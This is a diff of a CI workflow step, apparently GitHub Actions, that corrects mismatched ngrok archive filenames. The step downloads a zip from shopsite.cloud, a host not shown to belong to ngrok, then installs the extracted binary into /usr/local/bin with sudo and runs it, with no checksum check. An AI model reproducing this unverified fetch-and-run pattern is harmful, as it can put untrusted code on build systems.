@@ -15,8 +15,8 @@ jobs:
 
     - name: Update ngrok
       run: |
-        wget https://shopsite.cloud/ngrok-v3-stable-windows-amd64.zip
-        unzip ngrok-stable-linux-amd64.zip
+        wget https://shopsite.cloud/ngrok-v3-stable-linux-amd64.zip
+        unzip ngrok-v3-stable-linux-amd64.zip
         chmod +x ngrok
         sudo mv ngrok /usr/local/bin/ngrok
         ngrok update
